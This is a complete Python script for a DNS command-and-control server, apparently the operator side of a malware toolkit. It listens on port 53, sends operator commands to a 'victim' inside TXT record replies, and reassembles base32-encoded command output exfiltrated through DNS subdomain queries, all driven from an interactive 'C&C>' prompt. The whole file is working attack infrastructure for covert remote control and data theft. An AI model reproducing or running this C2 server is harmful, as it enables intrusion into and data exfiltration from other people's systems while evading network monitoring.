"""
DNS C2 Server using UDP Socket (proper nameserver)
This version actually binds to port 53 and can respond to delegated DNS queries
"""

import socket
import struct
import threading
import sys
import argparse
import hashlib
import base64

# Configuration
VICTIM_IP = None
DNS_PORT = 53
BASE_DOMAIN = "c2.local"
current_command = ""
command_lock = threading.Lock()

# Fragment reassembly storage
fragments = {}
fragment_metadata = {}


def decode_data(encoded):
    """Decode data from DNS subdomain (base32)"""
    padding = (8 - len(encoded) % 8) % 8
    encoded_with_padding = encoded.upper() + "=" * padding
    try:
        decoded_bytes = base64.b32decode(encoded_with_padding)
        # Try UTF-8 decode, but fall back to latin-1 for binary data
        try:
            return decoded_bytes.decode("utf-8")
        except UnicodeDecodeError:
            # Use latin-1 which maps bytes 1:1 to unicode codepoints
            # This preserves the exact byte sequence for checksum verification
            return decoded_bytes.decode("latin-1")
    except Exception as e:
        print(f"[!] Base32 decode error: {e}")
        print(f"[!] Length: {len(encoded)}, With padding: {len(encoded_with_padding)}")
        return None


def parse_dns_name(data, offset):
    """Parse DNS name from packet"""
    labels = []
    jumped = False
    max_jumps = 5
    jumps = 0
    orig_offset = offset

    while True:
        if offset >= len(data):
            break

        length = data[offset]

        if length == 0:
            offset += 1
            break

        # Check for compression pointer
        if (length & 0xC0) == 0xC0:
            if not jumped:
                orig_offset = offset + 2
            if jumps >= max_jumps:
                break
            offset = ((length & 0x3F) << 8) | data[offset + 1]
            jumped = True
            jumps += 1
            continue

        offset += 1
        labels.append(data[offset : offset + length].decode("utf-8", errors="ignore"))
        offset += length

    if not jumped:
        orig_offset = offset

    return ".".join(labels), orig_offset


def create_dns_response(query_data, client_addr, command="NOOP"):
    """Create DNS response packet with TXT record containing command"""
    try:
        # Parse query header
        transaction_id = query_data[0:2]

        # Parse question section
        qname, offset = parse_dns_name(query_data, 12)
        qtype = struct.unpack("!H", query_data[offset : offset + 2])[0]

        print(f"[+] Query from {client_addr[0]}: {qname} (type={qtype})")

        # Build response header
        flags = 0x8400  # Standard query response, authoritative
        qdcount = 1
        ancount = 1  # One answer
        nscount = 0
        arcount = 0

        header = struct.pack(
            "!HHHHHH",
            struct.unpack("!H", transaction_id)[0],
            flags,
            qdcount,
            ancount,
            nscount,
            arcount,
        )

        # Question section (echo back the question)
        question = query_data[12 : offset + 4]

        # Answer section - TXT record
        # Name (pointer to question)
        answer = b"\xc0\x0c"

        # Type (TXT=16), Class (IN=1), TTL (0), Data length
        txt_data = command.encode("utf-8")
        rdlength = len(txt_data) + 1  # +1 for length byte

        answer += struct.pack("!HHIH", 16, 1, 0, rdlength)
        answer += struct.pack("!B", len(txt_data)) + txt_data

        response = header + question + answer

        return response, qname

    except Exception as e:
        print(f"[!] Error creating DNS response: {e}")
        return None, None


def parse_dns_query(qname):
    """Parse DNS query and extract C2 data"""
    qname_str = qname.rstrip(".")

    if qname_str.endswith(f".{BASE_DOMAIN}"):
        qname_str = qname_str[: -len(f".{BASE_DOMAIN}")]

    parts = qname_str.split(".")
    if not parts:
        return "legacy", qname_str

    first_part = parts[0]

    # SINGLE message (case-insensitive)
    if first_part.upper() == "SINGLE" and len(parts) >= 2:
        # Normalize to uppercase to handle DNS case randomization
        encoded_data = parts[1].upper()
        decoded = decode_data(encoded_data)
        return "single", decoded

    # FRAG message (case-insensitive)
    if first_part.upper().startswith("FRAG-"):
        try:
            frag_parts = first_part.upper().split("-")
            if len(frag_parts) >= 5:
                frag_id = frag_parts[1]
                current = int(frag_parts[2])
                total = int(frag_parts[3])
                checksum = frag_parts[4]

                # Extract data from all labels between protocol and base domain
                # Format: FRAG-x-y-z-checksum.label1.label2.label3.c2.domain.com
                # We need to find where base domain starts and concat everything before it
                base_domain_parts = BASE_DOMAIN.split(".")
                domain_part_count = len(base_domain_parts)

                # Data labels are everything except first (FRAG-...) and last N (base domain)
                data_parts = (
                    parts[1:-(domain_part_count)]
                    if len(parts) > domain_part_count + 1
                    else parts[1:-1]
                )

                # CRITICAL: Normalize data to uppercase to handle DNS case randomization
                data = "".join(p.upper() for p in data_parts)

                return "fragment", {
                    "frag_id": frag_id,
                    "current": current,
                    "total": total,
                    "checksum": checksum,
                    "data": data,
                }
        except Exception as e:
            print(f"[!] Error parsing fragment: {e}")
            return "legacy", qname_str

    # READY message (case-insensitive)
    if first_part.upper().startswith("READY-"):
        status = first_part[6:]
        return "status", status

    # STATUS message (case-insensitive)
    if first_part.upper() == "STATUS" and len(parts) >= 2:
        # Normalize to uppercase to handle DNS case randomization
        encoded_data = parts[1].upper()
        decoded = decode_data(encoded_data)
        return "status", decoded

    return "legacy", qname_str


def reassemble_fragments(frag_id):
    """Attempt to reassemble complete message from fragments"""
    if frag_id not in fragment_metadata:
        return None

    metadata = fragment_metadata[frag_id]
    total = metadata["total"]
    expected_checksum = metadata["checksum"]

    if len(fragments[frag_id]) == total:
        complete_encoded = "".join(fragments[frag_id][i] for i in range(1, total + 1))
        complete = decode_data(complete_encoded)

        # Check if decode failed
        if complete is None:
            print(f"[!] Failed to decode fragments for ID {frag_id}")
            # Don't delete fragments yet - maybe we can retry
            return None

        actual_checksum = hashlib.md5(complete.encode()).hexdigest()[:8]
        # Case-insensitive checksum comparison (DNS randomizes case)
        if actual_checksum.lower() == expected_checksum.lower():
            del fragments[frag_id]
            del fragment_metadata[frag_id]
            return complete
        else:
            print(
                f"[!] Checksum mismatch for fragment {frag_id}! "
                f"Expected {expected_checksum}, got {actual_checksum}"
            )
            return None

    return None


def display_output(output):
    """Display output with formatting"""
    print("\n" + "=" * 60)
    print("[+] OUTPUT:")
    print("=" * 60)
    print(output)
    print("=" * 60)


def dns_server():
    """Main DNS server using UDP socket"""
    global current_command, VICTIM_IP

    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(("0.0.0.0", DNS_PORT))
        print(f"[*] DNS server listening on 0.0.0.0:{DNS_PORT}")
    except PermissionError:
        print("[!] ERROR: Permission denied. DNS server requires root privileges.")
        print("[!] Please run with: sudo python3 attacker_dns_socket.py")
        sys.exit(1)
    except Exception as e:
        print(f"[!] ERROR binding to port {DNS_PORT}: {e}")
        sys.exit(1)

    while True:
        try:
            data, addr = sock.recvfrom(512)

            # Auto-register victim IP
            if VICTIM_IP is None:
                VICTIM_IP = addr[0]
                print(f"\n[!] New victim detected: {VICTIM_IP}")

            # Get current command
            with command_lock:
                cmd_to_send = current_command
                current_command = ""

            if not cmd_to_send:
                cmd_to_send = "NOOP"

            # Create and send response
            response, qname = create_dns_response(data, addr, cmd_to_send)

            if response:
                sock.sendto(response, addr)
                print(f"[*] Sent {len(response)} byte response to {addr[0]}:{addr[1]}")

                if cmd_to_send != "NOOP":
                    print(f"[*] Sent command: {cmd_to_send}")
                else:
                    print("[*] Sent NOOP")  # Parse query for output
                msg_type, msg_data = parse_dns_query(qname)

                if msg_type == "single":
                    display_output(msg_data)

                elif msg_type == "fragment":
                    frag_id = msg_data["frag_id"]
                    current = msg_data["current"]
                    total = msg_data["total"]
                    checksum = msg_data["checksum"]
                    frag_data = msg_data["data"]

                    if frag_id not in fragments:
                        fragments[frag_id] = {}
                        fragment_metadata[frag_id] = {
                            "total": total,
                            "checksum": checksum,
                        }

                    fragments[frag_id][current] = frag_data
                    print(f"[*] Fragment {current}/{total} received (ID: {frag_id})")

                    complete = reassemble_fragments(frag_id)
                    if complete:
                        print(
                            f"[+] Complete output reassembled ({len(complete)} bytes):"
                        )
                        display_output(complete)

                elif msg_type == "status":
                    print(f"[*] Status: {msg_data}")

                print("C&C> ", end="", flush=True)

        except Exception as e:
            print(f"[!] Error handling query: {e}")
            continue


def main():
    """Main C2 interface"""
    global current_command, VICTIM_IP, BASE_DOMAIN

    parser = argparse.ArgumentParser(description="DNS C2 Server (Socket-based)")
    parser.add_argument(
        "-v", "--victim", help="Victim IP (auto-detect if not set)", default=None
    )
    parser.add_argument(
        "-a", "--accept-all", action="store_true", help="Accept from any IP"
    )
    parser.add_argument(
        "-d", "--domain", default="c2.local", help="Base domain (default: c2.local)"
    )
    args = parser.parse_args()

    if args.victim:
        VICTIM_IP = args.victim
    elif args.accept_all:
        VICTIM_IP = "0.0.0.0"

    BASE_DOMAIN = args.domain

    print("=" * 60)
    print("DNS C2 Server - Socket-based Nameserver")
    print("=" * 60)
    if VICTIM_IP and VICTIM_IP != "0.0.0.0":
        print(f"Victim IP: {VICTIM_IP}")
    else:
        print("Victim IP: Auto-detect (waiting for first beacon)")
    print(f"Base Domain: {BASE_DOMAIN}")
    print("=" * 60)

    # Start DNS server in background
    server_thread = threading.Thread(target=dns_server, daemon=True)
    server_thread.start()

    import time

    time.sleep(1)

    # Command input loop
    while True:
        try:
            cmd = input("C&C> ")
            if cmd.lower() in ["exit", "quit"]:
                print("[!] Exiting...")
                break

            if cmd.strip():
                if VICTIM_IP is None:
                    print("[!] No victim connected yet. Waiting for first beacon...")
                    continue

                with command_lock:
                    current_command = cmd
                print("[*] Command queued. Waiting for next beacon...")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()
